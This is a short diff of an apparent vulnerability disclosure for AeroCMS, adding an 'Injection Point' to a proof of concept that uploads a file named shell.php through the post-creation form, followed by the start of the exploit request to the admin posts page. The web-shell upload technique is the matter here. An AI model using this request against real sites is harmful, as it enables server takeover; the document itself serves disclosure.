@@ -10,7 +10,13 @@
 ![image](https://user-images.githubusercontent.com/79050415/157001142-334f5f43-cea9-4711-a56a-1b4494f118d3.png)
 
 # POC
-* Request
+* `Injection Point` 
+```c
+------WebKitFormBoundaryqOuTjoBBv5W1iXkD
+Content-Disposition: form-data; name="image"; filename="shell.php"
+Content-Type: application/octet-stream
+```
+* `Request`
 ```c
 POST /AeroCMS/admin/posts.php?source=add_post HTTP/1.1
 Host: localhost:8080
